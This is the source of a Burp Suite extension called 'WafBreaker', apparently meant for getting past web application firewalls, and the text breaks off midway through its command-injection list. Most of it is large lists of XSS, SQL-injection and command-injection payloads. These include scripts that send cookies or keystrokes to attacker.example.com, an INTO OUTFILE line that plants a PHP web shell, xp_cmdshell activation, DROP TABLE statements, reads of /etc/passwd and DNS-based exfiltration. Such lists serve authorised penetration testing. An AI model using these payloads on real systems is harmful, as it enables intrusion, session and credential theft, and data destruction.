
from burp import IBurpExtender, IContextMenuFactory, IScanIssue
from javax.swing import JMenuItem, JMenu
from java.util import ArrayList
from java.lang import Runnable
from java.lang import Thread as JThread
import re
import time
import zlib as _zlib
import struct as _struct

EXT_NAME  = "WafBreaker"
VERSION   = "1.0"


INITIAL_PROBES = {
    "XSS":               "<script>alert(1)</script>",
    "SQL Injection":     "' OR 1=1--",
    "Command Injection": "; id",
    "LFI":               "../../../etc/passwd",
    "SSRF":              "http://127.0.0.1/",
    "SSTI":              "{{7*7}}",
    "NoSQL Injection":   "[$ne]=1",
    "XXE":               "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
}

PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>console.log(document.domain)</script>",
        "<sCrIpT>alert(1)</sCriPt>",
        "<SCRIPT>ALERT(1)</SCRIPT>",
        "<ScRiPt>AlErT(1)</ScRiPt>",
        "<scri%00pt>alert(1)</scri%00pt>",
        "<scri\x00pt>alert(1)</scri\x00pt>",
        "<scri<script>pt>alert(1)</scr</script>ipt>",
        "<sc<script>ript>alert(1)</sc</script>ript>",
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        "<script>\\u0061lert('22')</script>",
        "<script>eval('\\x61lert(1)')</script>",
        "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
        "<script>String.fromCharCode(97,108,101,114,116)(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS');>",
        "<img src=x onerror=alert('XSS')//",
        "<img/src=1/onerror=alert(1)>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
        "<img src=1 onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
        "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
        "\"><img src=x onerror=alert('XSS');>",
        "<><img src=1 onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg onload=alert(1)//",
        "<svg><script>alert(1)</script></svg>",
        "<svg><script>alert&lpar;1&rpar;",
        "<svg id=alert(1) onload=eval(id)>",
        "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
        "\"><svg/onload=alert(/XSS/)>",
        "<svgonload=alert(1)>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
        "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
        "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
        "<svg><animatetransform onbegin=\"alert(1)\"></animatetransform></svg>",
        "<svg><script href=data:,alert(1) />",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<body onload=alert(1)>",
        "<body/onload=alert(1)>",
        "<body onload=alert(/XSS/.source)>",
        "<body ontouchstart=alert(1)>",
        "<body ontouchend=alert(1)>",
        "<body ontouchmove=alert(1)>",
        "<div onpointerover=\"alert(1)\">HOVER</div>",
        "<div onpointerdown=\"alert(1)\">CLICK</div>",
        "<div onpointerenter=\"alert(1)\">ENTER</div>",
        "<div onpointermove=\"alert(1)\">MOVE</div>",
        "<div onpointerout=\"alert(1)\">OUT</div>",
        "<div onpointerup=\"alert(1)\">UP</div>",
        "<video/poster/onerror=alert(1)>",
        "<video><source onerror=\"javascript:alert(1)\">",
        "<video src=_ onloadstart=\"alert(1)\">",
        "<video src=1 onerror=alert(1)>",
        "<audio src onloadstart=alert(1)>",
        "<audio src=1 onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<details/open/ontoggle=\"alert`1`\">",
        "<marquee onstart=alert(1)>",
        "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>",
        "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
        "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\" style=\"content-visibility:auto\">",
        "<object data=javascript:alert(1)>",
        "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;1&#x29;\">",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
        "<form action=javascript:alert(1)><input type=submit>",
        "<button onclick=alert(1)>XSS</button>",
        "javascript:alert(1)",
        "javascript:prompt(1)",
        "javascript:confirm(document.domain)",
        "javascript://%0Aalert(1)",
        "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
        "java%0ascript:alert(1)",
        "java%09script:alert(1)",
        "java%0dscript:alert(1)",
        "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)",
        "\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)",
        "\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",
        "<math href=\"javascript:alert(1)\">CLICK</math>",
        "&#34;&#62;&#60;img src=x onerror=confirm&#40;1&#41;&#62;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41",
        "%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341",
        "<STYLE>.x{background-image:url(\"javascript:alert(1)\")}</STYLE>",
        "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(1)>\");",
        "<a aa aaa aaaa href=javascript:alert(1)>xss</a>",
        "<a src=\"%3Aconfirm(1)\">",
        "<a href=\"javascript%3Aalert(1)\">click</a>",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "<a src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)\">",
        "<marquee onstart=\\u0070r\\u006fmpt(1)>",
        "<img src=x onerror=\\u0061lert(1)>",
        "data:text/html,<script>alert(0)</script>",
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+",
        "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
        "vbscript:msgbox(\"XSS\")",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        "\"onmouseover=\"alert(1)",
        "#\"><img src=/ onerror=alert(2)>",
        "-(confirm)(document.domain)//",
        "; alert(1);//",
        "<script>fetch('https://attacker.example.com',{method:'POST',mode:'no-cors',body:document.cookie});</script>",
        "<svg/onload='fetch(\"//attacker.example.com/\"+document.cookie)'>",
        "<script>new Image().src=\"http://attacker.example.com/?c=\"+document.cookie;</script>",
        "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://attacker.example.com/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
        "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
        "[a](javascript:prompt(document.cookie))",
        "[a](j a v a s c r i p t:prompt(document.cookie))",
        "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
        "[a](javascript:window.onerror=alert;throw%201)",
        "<script>debugger;</script>",
        "<script>alert(document.domain.concat('\\n').concat(window.origin))</script>",
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
        "#{7*7}",
        "*{color:red}",
        "{{$on.constructor('alert(1)')()}}",
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
        "1&ng-app&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
        "<select onchange=alert(1)><option>1</option><option>2</option></select>",
        "<form><button formaction=javascript:alert(1)>CLICK</button></form>",
        "<isindex action=javascript:alert(1) type=image>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
        "<svg onx=() onload=(confirm)(1)>",
        "<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>",
        "<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f>",
        "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\\u0061\\u006C\\u0065\\u0072\\u0074&lpar;1&rpar;\">X</a>",
        "javascript:{alert`0`}",
        "<j id=x style=\"-webkit-user-modify:read-write\" onfocus={window.onerror=eval}throw/0/+name>H</j>#x",
        "<body style=\"height:1000px\" onwheel=\"alert(1)\">",
        "<div contextmenu=\"xss\">Right-Click<menu id=\"xss\" onshow=\"alert(1)\">",
        "<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere",
        "<a69/onclick=[1].findIndex(alert)>pew",
        "<table background=\"javascript:alert(1)\"></table>",
        "\"/><marquee onfinish=confirm(123)>a</marquee>",
        "<input/oninput='new Function`confir\\u006d\\`0\\``'>",
        "<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme",
        "<img src=\"WTF\" onError=\"{var {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2Bh%2Bn)(/0wn3d/.source)\" />",
        "<strong><button popovertarget=x>click</button><test onbeforetoggle=alert(document.domain) popover id=x>x</test></strong>",
        "<a href=\"jav%0Dascript&colon;alert(1)\">",
        "<iframe src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)\">",
        "<script>eval('al'+'er'+'t()')</script>",
        "<script>+-+-1-+-+alert(1)</script>",
        "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
        "<!--><script>alert/**/()/**/</script>",
        "<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
        "<script>eval(atob(decodeURIComponent('YWxlcnQoMSk=')))</script>",
        "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)\">",
        "<!--<img src=x onerror=alert(1)-->",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributename=onmouseover value=alert(1)>",
        "<custom-tag><script>alert(1)</script></custom-tag>",
        "<a is=img src=x onerror=alert(1)>",
        "<base href='//evil.com/'>",
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "{{7*7}}{{constructor.constructor('alert(1)')()}}",
        "{{_c.constructor('alert(1)')()}}",
        "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "<img src=x onpointerover=alert(1)>",
        "<img src=x ontransitionend=alert(1) style='transition:1s'>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<video autoplay onplay=alert(1)><source src=x></video>",
        "<input autofocus onfocus=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<object data='javascript:alert(1)'>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<iframe src=javascript:alert(1)>",
        "</style><style>@import'//evil.com/x?c=",
        "<link rel=stylesheet href='//evil.com/x.css'>",
        "<svg><script href=data:,alert(1) />",
        "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">",
        "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<form><isindex formaction=javascript:alert(1) type=submit>",
        "<form id=x></form><button form=x formaction=javascript:alert(1)>clickme",
        "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)\">",
        "<!--<img src=x onerror=alert(1)-->",
        "<p title='</p><img src=x onerror=alert(1)'>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributename=onmouseover value=alert(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'/>",
        "javascript:void(alert(1))",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "<a href=javascript:alert(1)>click</a>",
        "<a href=\"javascript&colon;alert(1)\">click</a>",
        "\"onmouseover=\"alert(1)\"",
        "\" autofocus onfocus=alert(1) \"",
        "' autofocus onfocus='alert(1)'",
        "onmouseover=alert(1)//",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "<img src=x\tonerror=alert(1)>",
        "<img src=x\nonerror=alert(1)>",
        "<img src=x\ronerror=alert(1)>",
        "<img src=x o\x00nerror=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<img src=x o&#110;error=alert(1)>",
        "<img src=x o&#0110;error=alert(1)>",
        "<img src=x on&#x65;rror=alert(1)>",
        "<img src=x onpointerover=alert(1)>",
        "<img src=x ontransitionend=alert(1) style=\"transition:1s\">",
        "<img src=x onanimationend=alert(1) style=\"animation:x 1s\">",
        "<details open ontoggle=alert(1)>",
        "<details ontoggle=alert(1) open>test</details>",
        "<marquee onstart=alert(1)>test</marquee>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)></textarea>",
        "<video autoplay onplay=alert(1)><source src=x></video>",
        "<input oninput=alert(1) value=x autofocus>",
        "<body oncut=alert(1)>",
        "<body oncopy=alert(1)>",
        "<body onpaste=alert(1)>",
        "<div onwheel=alert(1)>scroll</div>",
        "<div onscroll=alert(1) style=\"overflow:scroll;height:50px;width:50px\">x<br><br><br></div>",
        "<body ondrag=alert(1)>drag</body>",
        "<img src=x onpointerenter=alert(1)>",
        "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
        "<svg><script>alert&lpar;1&rpar;</script></svg>",
        "<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        "<svg/onload=fetch('/').then(r=>r.text()).then(eval)>",
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "{{7*7}}{{constructor.constructor('alert(1)')()}}",
        "{{_c.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "%{alert(1)}",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "<embed src=javascript:alert(1)>",
        "<embed src=\"data:text/html,<script>alert(1)</script>\">",
        "</style><style>@import'//x.x?c=",
        "<link rel=stylesheet href='//x.x/x.css'>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "*{color:expression(alert(1))}",
        "<custom-element><script>alert(1)</script></custom-element>",
        "<a is=img src=x onerror=alert(1)>",
        "<base href='//evil.example.com/'>",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "<script>/* </script><script>*/alert(1)</script>",
        "<!--<script>-->alert(1)<!--</script>-->",
        "<img src=x onerror=\"Object.prototype.toString=alert;throw 1\">",
        "<script>import('data:text/javascript,alert(1)')</script>",
        "<script>fetch('/').then(r=>r.text()).then(eval)</script>",
        "<script>/*@cc_on alert(1) @*/</script>",
        "<!--[if IE]><script>alert(1)</script><![endif]-->",
    ],

    "SQL Injection": [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR '1'='1'--",
        "' or 1=1 limit 1 --",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "1 OR 1=1",
        "1' OR '1'='1",
        "or 1-- -",
        "' or 1 or '1",
        "\"or 1 or\"",
        "admin'--",
        "admin' #",
        "admin'/*",
        "admin' OR '1'='1",
        "' OR 'x'='x",
        "admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,2 FROM information_schema.tables--",
        "' UNION SELECT column_name,2 FROM information_schema.columns--",
        "' UNION SELECT @@version,2--",
        "' UNION SELECT user(),2--",
        "' UNION SELECT database(),2--",
        "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
        "' un/**/ion sel/**/ect 1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "' UNION%20SELECT%201,2,3--",
        "' UNION%09SELECT%091,2,3--",
        "'+UNION+SELECT+1,2,3--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/*!12345UNION*//*!12345SELECT*/1--",
        "/**//*!50000%55nIOn*//**//*!50000%53eLECt*//**/1,2,3--",
        "/_!%55NiOn_/ /_!%53eLEct_/ 1,2,3--",
        "+#uNiOn+#sEleCt+1,2,3--",
        "/_!u%6eion_/ /_!se%6cect_/ 1,2,3--",
        "1%09AND%091=1%09--",
        "1%0AAND%0A1=1%0A--",
        "1%0BAND%0B1=1%0B--",
        "1%0CAND%0C1=1%0C--",
        "1%0DAND%0D1=1%0D--",
        "1%A0AND%A01=1%A0--",
        "(1)AND(1)=(1)--",
        "1%09union%09select%091,2,3--",
        "uni%0bon+se%0blect+1,2,3--",
        "1+UnIoN/**/SeLecT/**/1,2,3--",
        "1+UNunionION+SEselectLECT+1,2,3--",
        "%55nion(%53elect)1,2,3--",
        "union%20distinct%20select%201,2,3--",
        "u%6eion se%6cect 1,2,3--",
        "unio%6e se%6cect 1,2,3--",
        "1;select+1&id=2,3+from+users+where+id=1--",
        "1+union/_&b=_/select+1,2,3--",
        "concat(0x223e,@@version)",
        "concat(0x273e27,version(),0x3c212d2d)",
        "(1)union(select(1),hex(hash)from(users))",
        "(1)union(((((((select(1),hex(hash)from(users))))))))",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' ORDER BY 4--",
        "1' ORDER BY 5--",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1--",
        "1' RLIKE '1",
        "1' OR '1' LIKE '1",
        "1) OR (1=1",
        "1)) OR ((1=1",
        "/?id=1+OR+0x50=0x50",
        "1 AND LENGTH(@@hostname)=1--",
        "1 AND ASCII(SUBSTRING(@@hostname,1,1))>64--",
        "SUBSTRING(VERSION(),1,1)LIKE(5)",
        "SUBSTRING(VERSION(),1,1)NOT IN(4,3)",
        "SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
        "' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS NUMERIC)--",
        "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND 1=CONVERT(INT,@@version)--",
        "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
        "' AND SLEEP(5)--",
        "' AND SLEEP(5)#",
        "' OR SLEEP(5)#",
        "' AND '1'='1' AND SLEEP(5)",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(SUBSTRING(VERSION(),1,1)=5,SLEEP(5),0)--",
        "1 AND ELT(1=1,SLEEP(5))--",
        "RLIKE SLEEP(5)",
        "' AND BENCHMARK(5000000,MD5('test'))--",
        "' OR BENCHMARK(5000000,SHA1('test'))--",
        "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT 1 FROM PG_SLEEP(5))--",
        "' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",
        "1; WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'",
        "';waitfor delay '0:0:5'--",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        "' OR DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
        "'; SELECT * FROM users--",
        "1'; DROP TABLE users--",
        "1; EXEC xp_cmdshell('whoami')--",
        "1; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
        "' OR 1=1%00",
        "' OR 1=1\x00",
        "%2527 OR 1=1--",
        "%27 OR 1=1--",
        "' UNION SELECT LOAD_FILE('/etc/passwd'),2--",
        "' INTO OUTFILE '/var/www/html/sh.php' LINES TERMINATED BY '<?php system($_GET[c]); ?>'--",
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.example.com\\\\a'))--",
        "test' AND 1=1--",
        "test' AND 1=2--",
        "test' OR 1=1--",
        "test' OR 1=2--",
        "admin' OR '1'='1",
        "admin' OR '1'='2",
        "test' AND 'a'='a",
        "test' AND 'a'='b",
        "a' OR 'x'='x",
        "a' OR 'x'='y",
        "(test)' OR 1=1--",
        "(test)' AND 1=1--",
        "x' OR 1=1 OR 'x'='y",
        "foo' OR 1=1 LIMIT 1--",
        "bar' OR 1=1 LIMIT 1 OFFSET 0--",
        "test') OR ('1'='1",
        "test')) OR (('1'='1",
        "1' AND '1'='1' AND SLEEP(0)--",
        "1 AND 1=1--",
        "1 AND 1=2--",
        "0 OR 1=1--",
        "2 OR 1=1--",
        "1 AND TRUE--",
        "1 AND FALSE--",
        "1) AND (1=1",
        "1)) OR ((1=1",
        "1 AND 1=1 LIMIT 1--",
        "1 OR 2>1--",
        "-1 OR 2>1--",
        "0 UNION SELECT NULL--",
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "test' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "test' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        "test' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "test' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e))--",
        "test' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "test' AND 1=CONVERT(INT,@@version)--",
        "test' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
        "test' AND SLEEP(5)--",
        "test' OR SLEEP(5)--",
        "test' AND SLEEP(5) AND 'x'='x",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(ASCII(SUBSTRING(database(),1,1))>90,SLEEP(5),0)--",
        "test' AND BENCHMARK(5000000,MD5('test'))--",
        "test'; WAITFOR DELAY '0:0:5'--",
        "test' AND (SELECT 1 FROM PG_SLEEP(5))=1--",
        "test' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        "test' UNION SELECT NULL--",
        "test' UNION SELECT NULL,NULL--",
        "test' UNION SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,2,3--",
        "-1' UNION ALL SELECT NULL,NULL,NULL--",
        "test' UNION SELECT @@version,NULL--",
        "test' UNION SELECT user(),database()--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "test' UNION SELECT 1,CONCAT(0x7e,@@version,0x7e),3--",
        "0' UNION SELECT username,password,3 FROM users--",
        "test'; SELECT 1--",
        "test'; INSERT INTO users VALUES(1,'hacked','hacked')--",
        "test'; DROP TABLE users--",
        "1; EXEC xp_cmdshell('whoami')--",
        "test'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
        "%09AND%091=1%09--",
        "%0AAND%0A1=1%0A--",
        "%0DAND%0D1=1%0D--",
        "%0CAND%0C1=1%0C--",
        "%0BAND%0B1=1%0B--",
        "%A0AND%A01=1%A0--",
        "%09OR%091=1%09--",
        "%0AOR%0A1=1%0A--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/**/aND/**/1=1/**/--",
        "-1/**/oR/**/1=1--",
        "1 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))",
        "1 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END))",
        "' RLIKE SLEEP(3)-- -",
        "(1)oR(1=1)--",
        "(1)aND(1=1)--",
        "'oR(2)LiKE(2)-- -",
        "'oR true-- -",
        "'||true-- -",
        "'||2=2-- -",
        "'||'2'LiKE'2'-- -",
        "%bf' OR 1=1-- -",
        "%A8%27 OR 1=1-- -",
        "%8C%A8%27 OR 1=1-- -",
        "' UNION SELECT 1,2,3`",
        "' UnION SELeCT 1,2,3`",
        "'UniON(SElecT(1),2,3)-- -",
        "'UniON(SElecT(1),NULL,NULL)-- -",
        "\"UniON(SElecT(1),2,3)-- -",
        "' OR IF(1=1,1,0)-- -",
        "' AND IF(1=1,SLEEP(0),SLEEP(3))-- -",
        "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -",
        "' AND (SELECT SUBSTRING(@@version,1,1))='8'-- -",
        "' AND (SELECT SUBSTRING(version(),1,1))='P'-- -",
        "1+1-2 AND 1=1--",
        "2*1-1 AND 1=1--",
        "0x41=0x41 AND 1=1--",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or username like '%",
        "' or uid like '%",
        "ffifdyop",
        "' OR JSON_LENGTH('{}')<=8896-- -",
        "' OR JSON_VALID('1')-- -",
        "' UNION distinctrow SELECT NULL,NULL,NULL-- -",
        "' UNION distinctrow SELECT @@version,NULL,NULL-- -",
        "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -",
        "' AND LOAD_FILE(CONCAT(0x5c5c5c5c,@@version,0x2e,0x6578616d706c65,0x2e636f6d,0x5c5c612))--",
        "'; EXEC master..xp_dirtree '//'+@@version+'.x.example.com/a'-- -",
    ],

    "Command Injection": [
        "; id",
        "; id #",
        "; id //",
        "; whoami",
        "; cat /etc/passwd",
        "; uname -a",
        "; ls -la /",
        "; ls -la /etc/",
        "; env",
        "; printenv",
        "; hostname",
        "; ifconfig",
        "; ip a",
        "| id",
        "|| id",
        "| whoami",
        "| cat /etc/passwd",
        "| uname -a",
        "|id",
        "||id",
        "|whoami",
        "& id",
        "&& id",
        "& whoami",
        "&id",
        "&&id",
        "\n id",
        "\r\n id",
        "%0aid",
        "%0a id",
        "%0a%0d id",
        "%0did",
